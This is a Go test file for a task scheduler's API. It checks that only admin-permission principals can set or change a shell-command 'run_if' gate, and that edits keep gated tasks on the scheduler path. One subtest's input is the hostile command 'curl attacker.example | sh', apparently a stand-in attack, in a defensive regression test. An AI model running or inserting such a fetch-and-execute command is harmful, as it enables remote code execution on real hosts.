// Copyright (c) 2025 ElcanoTek
// SPDX-License-Identifier: MIT

package handlers

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"

	"github.com/ElcanoTek/fleet/internal/sched/apikeys"
	"github.com/ElcanoTek/fleet/internal/sched/models"
	"github.com/ElcanoTek/fleet/internal/sched/storage"
)

// setupRunIfAuthz wires the three run_if-bearing routes with a fresh key
// manager and two session users, so every credential class (admin API key,
// scoped keys, admin-role and client-role users) can be exercised against the
// run_if privilege boundary.
func setupRunIfAuthz(t *testing.T) (*chi.Mux, *apikeys.Manager, *storage.Storage) {
	t.Helper()
	_, store, cleanup := setupTestHandlerWithStore(t)
	t.Cleanup(cleanup)

	keyMgr, err := apikeys.NewManager(filepath.Join(t.TempDir(), "api_keys.json"), filepath.Join(t.TempDir(), "audit.jsonl"))
	if err != nil {
		t.Fatalf("key mgr: %v", err)
	}
	h := New(Config{DefaultTaskModel: "test/model", AdminAPIKey: "test-admin-key", Version: "0.1.0"}, store, keyMgr)

	r := chi.NewRouter()
	r.Post("/tasks", h.CreateTask)
	r.Post("/tasks/batch", h.CreateTaskBatch)
	r.Group(func(r chi.Router) {
		r.Use(h.AdminOrUserAuthMiddleware)
		r.Put("/tasks/{task_id}", h.UpdateTask)
	})

	for _, u := range []struct{ username, role, token string }{
		{"runif-admin", "admin", "runif-admin-token"},
		{"runif-client", "client", "runif-client-token"},
	} {
		hash := models.HashToken(u.token)
		if _, err := store.AddUser(&models.User{
			ID: uuid.New(), Username: u.username, Role: u.role, CreatedAt: time.Now(), SessionToken: &hash,
		}); err != nil {
			t.Fatalf("AddUser(%s): %v", u.username, err)
		}
	}
	return r, keyMgr, store
}

// TestCreateTaskRunIfRequiresAdminPermission locks the create-path privilege
// boundary to possession of models.PermissionAdmin. Before the fix,
// authorizeTaskCreator marked ANY scoped key carrying create_task as admin —
// so a plain CI key could attach a run_if string that executes on the host as
// the fleet user — while a genuine admin-ROLE user was refused.
func TestCreateTaskRunIfRequiresAdminPermission(t *testing.T) {
	r, keyMgr, _ := setupRunIfAuthz(t)

	clientKey := mustCreateRoleKey(t, keyMgr, "client")
	adminScopedKey := mustCreateRoleKey(t, keyMgr, "admin")

	gated := models.TaskCreate{
		Prompt: "a gated task prompt that is long enough",
		RunIf:  &models.RunIf{Command: "true", TimeoutSeconds: 30, OnError: models.RunIfOnErrorRun},
	}
	post := func(auth func(*http.Request), tc models.TaskCreate) *httptest.ResponseRecorder {
		body, _ := json.Marshal(tc)
		req := httptest.NewRequest("POST", "/tasks", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		auth(req)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w
	}

	t.Run("scoped create_task key with run_if is 403", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("X-API-Key", clientKey) }, gated)
		if w.Code != http.StatusForbidden {
			t.Fatalf("scoped key + run_if = %d, want 403: %s", w.Code, w.Body.String())
		}
	})

	t.Run("scoped create_task key without run_if still creates", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("X-API-Key", clientKey) },
			models.TaskCreate{Prompt: "an ungated task prompt that is long enough"})
		if w.Code != http.StatusOK {
			t.Fatalf("scoped key, no run_if = %d, want 200: %s", w.Code, w.Body.String())
		}
	})

	t.Run("client-role user with run_if is 403", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("Authorization", "Bearer runif-client-token") }, gated)
		if w.Code != http.StatusForbidden {
			t.Fatalf("client user + run_if = %d, want 403: %s", w.Code, w.Body.String())
		}
	})

	t.Run("admin API key with run_if creates", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("X-API-Key", "test-admin-key") }, gated)
		if w.Code != http.StatusOK {
			t.Fatalf("admin key + run_if = %d, want 200: %s", w.Code, w.Body.String())
		}
	})

	t.Run("admin-permission scoped key with run_if creates", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("X-API-Key", adminScopedKey) }, gated)
		if w.Code != http.StatusOK {
			t.Fatalf("admin scoped key + run_if = %d, want 200: %s", w.Code, w.Body.String())
		}
	})

	t.Run("admin-role user with run_if creates", func(t *testing.T) {
		w := post(func(r *http.Request) { r.Header.Set("Authorization", "Bearer runif-admin-token") }, gated)
		if w.Code != http.StatusOK {
			t.Fatalf("admin user + run_if = %d, want 200: %s", w.Code, w.Body.String())
		}
	})

	t.Run("batch path refuses a scoped key's run_if per task", func(t *testing.T) {
		body, _ := json.Marshal(models.BatchTaskCreate{Tasks: []models.TaskCreate{gated}})
		req := httptest.NewRequest("POST", "/tasks/batch", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-API-Key", clientKey)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		if w.Code != http.StatusMultiStatus {
			t.Fatalf("batch scoped key + run_if = %d, want 207: %s", w.Code, w.Body.String())
		}
		var res models.BatchTaskResult
		if err := json.Unmarshal(w.Body.Bytes(), &res); err != nil {
			t.Fatalf("decode batch result: %v", err)
		}
		if res.Count != 0 || len(res.Failed) != 1 {
			t.Fatalf("batch result = %+v, want the gated task refused", res)
		}
	})
}

// TestUpdateTaskRunIfPersistsAndNormalizes locks the edit path: an
// admin-permission principal's run_if is actually persisted (changed OR
// removed — before the fix UpdateTask 403'd non-admins on run_if changes yet
// silently discarded the field for everyone), and a non-admin echoing an
// unchanged gate modulo defaultable fields (OnError "", omitted timeout) is
// not refused, while a real change attempt still is.
func TestUpdateTaskRunIfPersistsAndNormalizes(t *testing.T) {
	r, keyMgr, store := setupRunIfAuthz(t)

	clientKey := mustCreateRoleKey(t, keyMgr, "client")

	// The gated tasks are seeded SCHEDULED: that is where a gate normally lives
	// (models.RunIf's enforcement contract parks every gated task on the
	// scheduler path), and gate changes on a pending task are refused outright
	// — the pending refusal has its own subtests below.
	addGatedWithStatus := func(t *testing.T, status models.TaskStatus) *models.Task {
		t.Helper()
		future := time.Now().UTC().Add(time.Hour)
		task := &models.Task{
			ID: uuid.New(), Prompt: "a gated task prompt that is long enough",
			Status: status, CreatedAt: time.Now().UTC(), ScheduledFor: &future,
			RunIf: &models.RunIf{Command: "test -f /tmp/ready", ExitCodeIs: 2, TimeoutSeconds: 30},
		}
		if _, err := store.AddTask(task); err != nil {
			t.Fatalf("add task: %v", err)
		}
		return task
	}
	addGated := func(t *testing.T) *models.Task {
		t.Helper()
		return addGatedWithStatus(t, models.TaskStatusScheduled)
	}
	put := func(taskID uuid.UUID, auth func(*http.Request), tc models.TaskCreate) *httptest.ResponseRecorder {
		body, _ := json.Marshal(tc)
		req := httptest.NewRequest("PUT", "/tasks/"+taskID.String(), bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		auth(req)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w
	}
	asClient := func(r *http.Request) { r.Header.Set("X-API-Key", clientKey) }
	asAdminKey := func(r *http.Request) { r.Header.Set("X-API-Key", "test-admin-key") }
	asAdminUser := func(r *http.Request) { r.Header.Set("Authorization", "Bearer runif-admin-token") }

	t.Run("non-admin echoing the gate modulo defaults is not refused", func(t *testing.T) {
		task := addGated(t)
		// OnError round-trips as the resolved "run" (stored ""), everything
		// else identical — the shape a client echo produces.
		w := put(task.ID, asClient, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "test -f /tmp/ready", ExitCodeIs: 2, TimeoutSeconds: 30, OnError: models.RunIfOnErrorRun},
		})
		if w.Code != http.StatusOK {
			t.Fatalf("non-admin unchanged-gate edit = %d, want 200: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf == nil || got.RunIf.OnError != "" || got.RunIf.ExitCodeIs != 2 {
			t.Errorf("stored gate must be kept byte-identical, got %+v", got.RunIf)
		}
		if got.Prompt != "an edited prompt that is long enough" {
			t.Errorf("unrelated edit must apply, got prompt %q", got.Prompt)
		}
	})

	t.Run("non-admin changing the gate is 403", func(t *testing.T) {
		task := addGated(t)
		w := put(task.ID, asClient, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "curl attacker.example | sh", TimeoutSeconds: 30},
		})
		if w.Code != http.StatusForbidden {
			t.Fatalf("non-admin gate change = %d, want 403: %s", w.Code, w.Body.String())
		}
	})

	t.Run("non-admin removing the gate is 403", func(t *testing.T) {
		task := addGated(t)
		w := put(task.ID, asClient, models.TaskCreate{Prompt: "an edited prompt that is long enough"})
		if w.Code != http.StatusForbidden {
			t.Fatalf("non-admin gate removal = %d, want 403: %s", w.Code, w.Body.String())
		}
	})

	t.Run("admin key change persists", func(t *testing.T) {
		task := addGated(t)
		w := put(task.ID, asAdminKey, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "test -f /tmp/other", TimeoutSeconds: 60, OnError: models.RunIfOnErrorSkip},
		})
		if w.Code != http.StatusOK {
			t.Fatalf("admin gate change = %d, want 200: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf == nil || got.RunIf.Command != "test -f /tmp/other" || got.RunIf.TimeoutSeconds != 60 {
			t.Errorf("admin gate change must persist, got %+v", got.RunIf)
		}
	})

	t.Run("admin key removal persists", func(t *testing.T) {
		task := addGated(t)
		w := put(task.ID, asAdminKey, models.TaskCreate{Prompt: "an edited prompt that is long enough"})
		if w.Code != http.StatusOK {
			t.Fatalf("admin gate removal = %d, want 200: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf != nil {
			t.Errorf("admin removal must clear the gate, got %+v", got.RunIf)
		}
	})

	t.Run("admin-role user change persists", func(t *testing.T) {
		task := addGated(t)
		w := put(task.ID, asAdminUser, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "true", TimeoutSeconds: 30},
		})
		if w.Code != http.StatusOK {
			t.Fatalf("admin-role gate change = %d, want 200: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf == nil || got.RunIf.Command != "true" {
			t.Errorf("admin-role gate change must persist, got %+v", got.RunIf)
		}
	})

	// A pending task is already past the scheduled→pending promotion — the one
	// point where a gate is evaluated (models.RunIf's enforcement contract) —
	// so attaching or changing a gate there would be dead config for the
	// imminent dispatch and is refused even for admins. Removal stays allowed.
	t.Run("admin changing the gate on a pending task is 409", func(t *testing.T) {
		task := addGatedWithStatus(t, models.TaskStatusPending)
		w := put(task.ID, asAdminKey, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "test -f /tmp/other", TimeoutSeconds: 30},
		})
		if w.Code != http.StatusConflict {
			t.Fatalf("admin gate change on pending = %d, want 409: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf == nil || got.RunIf.Command != "test -f /tmp/ready" {
			t.Errorf("refused edit must leave the stored gate untouched, got %+v", got.RunIf)
		}
	})

	t.Run("admin attaching a gate to a pending task is 409", func(t *testing.T) {
		task := &models.Task{
			ID: uuid.New(), Prompt: "an ungated pending task prompt",
			Status: models.TaskStatusPending, CreatedAt: time.Now().UTC(),
		}
		if _, err := store.AddTask(task); err != nil {
			t.Fatalf("add task: %v", err)
		}
		w := put(task.ID, asAdminKey, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  &models.RunIf{Command: "true", TimeoutSeconds: 30},
		})
		if w.Code != http.StatusConflict {
			t.Fatalf("admin gate attach on pending = %d, want 409: %s", w.Code, w.Body.String())
		}
	})

	t.Run("admin removing the gate on a pending task persists", func(t *testing.T) {
		task := addGatedWithStatus(t, models.TaskStatusPending)
		w := put(task.ID, asAdminKey, models.TaskCreate{Prompt: "an edited prompt that is long enough"})
		if w.Code != http.StatusOK {
			t.Fatalf("admin gate removal on pending = %d, want 200: %s", w.Code, w.Body.String())
		}
		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.RunIf != nil {
			t.Errorf("removal must clear the gate, got %+v", got.RunIf)
		}
	})
}

// TestUpdateTaskKeepsGatedTaskOnSchedulerPath is the regression test for the
// edit-path gate bypass: UpdateEditableTask used to recompute status from
// ScheduledFor alone, so a non-admin create_task principal editing a gated
// SCHEDULED task — echoing the gate unchanged (which passes the run_if
// authorization checks) and omitting scheduled_for (the natural client echo:
// the parked past timestamp would be rejected by validateTaskCreate) —
// flipped the task to status=pending, scheduled_for=nil with run_if intact
// and never evaluated. The same ScheduledFor-only recompute also flipped an
// edited webhook trigger TEMPLATE (scheduled, nil scheduled_for) to pending,
// turning an inert template into a one-shot run. The recompute now shares
// NewTask's derivation (models.DeriveDispatchState), so no edit can move a
// gated task or a template off the scheduler path.
func TestUpdateTaskKeepsGatedTaskOnSchedulerPath(t *testing.T) {
	r, keyMgr, store := setupRunIfAuthz(t)

	clientKey := mustCreateRoleKey(t, keyMgr, "client")
	put := func(taskID uuid.UUID, tc models.TaskCreate) *httptest.ResponseRecorder {
		body, _ := json.Marshal(tc)
		req := httptest.NewRequest("PUT", "/tasks/"+taskID.String(), bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-API-Key", clientKey)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w
	}
	// The echo shape a client produces from the stored gate: OnError
	// round-trips as the resolved "run" (stored ""), everything else
	// identical, so it passes the runIfChanged guards as an unchanged gate.
	gate := &models.RunIf{Command: "test -f /tmp/ready", TimeoutSeconds: 30}
	gateEcho := &models.RunIf{Command: "test -f /tmp/ready", TimeoutSeconds: 30, OnError: models.RunIfOnErrorRun}

	t.Run("gated task cannot be unparked by an edit omitting scheduled_for", func(t *testing.T) {
		// Seeded the way NewTask parks an immediate gated create: scheduled,
		// with the parked timestamp in the past by the time the edit lands.
		past := time.Now().UTC().Add(-time.Minute)
		task := &models.Task{
			ID: uuid.New(), Prompt: "a gated task prompt that is long enough",
			Status: models.TaskStatusScheduled, CreatedAt: time.Now().UTC(),
			ScheduledFor: &past, RunIf: gate,
		}
		if _, err := store.AddTask(task); err != nil {
			t.Fatalf("add task: %v", err)
		}

		w := put(task.ID, models.TaskCreate{
			Prompt: "an edited prompt that is long enough",
			RunIf:  gateEcho,
		})
		if w.Code != http.StatusOK {
			t.Fatalf("non-admin unchanged-gate edit = %d, want 200: %s", w.Code, w.Body.String())
		}

		got, err := store.GetTask(task.ID)
		if err != nil {
			t.Fatalf("get task: %v", err)
		}
		if got.Status != models.TaskStatusScheduled {
			t.Fatalf("status = %q, want scheduled — the edit moved a gated task off the scheduler path, so its gate would never be evaluated", got.Status)
		}
		if got.ScheduledFor == nil {
			t.Fatal("scheduled_for = nil; GetScheduledTasks requires it non-nil, so the gate would never run — or, pre-fix, the task dispatched as pending")
		}
		if got.RunIf == nil || got.RunIf.Command != "test -f /tmp/ready" {
			t.Errorf("gate must survive the edit, got %+v", got.RunIf)
		}
	})

	t.Run("webhook template edit keeps the template inert", func(t *testing.T) {
		template := models.NewTask(models.TaskCreate{
			Prompt:      "a webhook template prompt that is long enough",
			TriggerType: models.TriggerTypeWebhook,
			RunIf:       gate,
		})
		if _, err := store.AddTask(template); err != nil {
			t.Fatalf("add template: %v", err)
		}

		w := put(template.ID, models.TaskCreate{
			Prompt: "an edited template prompt that is long enough",
			RunIf:  gateEcho,
		})
		if w.Code != http.StatusOK {
			t.Fatalf("template edit = %d, want 200: %s", w.Code, w.Body.String())
		}

		got, err := store.GetTask(template.ID)
		if err != nil {
			t.Fatalf("get template: %v", err)
		}
		if got.Status != models.TaskStatusScheduled {
			t.Fatalf("status = %q, want scheduled — the edit turned an inert template into a one-shot run", got.Status)
		}
		// The template itself must never surface as due; its gate applies to
		// each spawned run instead.
		if got.ScheduledFor != nil {
			t.Errorf("scheduled_for = %v, want nil (template must stay inert)", got.ScheduledFor)
		}
		if got.Prompt != "an edited template prompt that is long enough" {
			t.Errorf("unrelated edit must apply, got prompt %q", got.Prompt)
		}
	})
}
